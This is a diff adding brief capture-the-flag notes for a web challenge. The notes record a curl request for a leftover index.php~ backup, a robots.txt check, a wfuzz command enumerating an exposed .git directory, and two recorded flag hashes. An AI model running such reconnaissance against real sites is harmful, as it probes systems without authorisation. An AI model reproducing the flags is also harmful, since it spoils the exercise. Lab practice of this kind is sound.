@@ -1,0 +1,16 @@
+curl -v http://burger.laboratorium.ee:8006/index.php\~
+Flag 4 of 4 is: f69194d78aedafacf8073de62543c59ca08ac035
+Please enter 4 flags, separated by underscore (_).
+
+robots.txt
+falg 2 of 4 is: 3f9c348c5b19a5166797b374aefd9df1df48a70a
+
+wfuzz -u http://burger.laboratorium.ee:8006/.git/FUZZ -w /home/divyanshu/wfuzz/wordlist/general/git.txt -c --hc 404
+config
+index
+description
+HEAD
+COMMIT_EDITMSG
+info/
+logs/
+objects/
